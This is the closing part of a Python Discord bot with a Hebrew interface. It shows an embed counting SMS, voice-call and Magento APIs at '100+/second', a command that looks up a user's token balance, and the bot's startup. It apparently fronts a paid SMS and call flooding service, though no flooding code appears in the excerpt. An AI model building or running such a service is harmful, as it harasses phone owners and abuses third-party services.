        description=f"**{TOTAL_APIS}** APIs | {MAGENTO_COUNT} מג'נטו | {SMS_COUNT} SMS | {VOICE_COUNT} שיחות",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 פעיל", value=active, inline=True)
    embed.add_field(name="🚀 מהירות", value="100+/שנייה", inline=True)
    
    view = MainView()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def tokens_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    await interaction.response.send_message(f"💎 **הטוקנים שלך:** {tokens}", ephemeral=True)

if __name__ == "__main__":
    logging.info(f"💥 STARTING ULTIMATE EDITION with {TOTAL_APIS} APIs")
    bot.run(TOKEN)
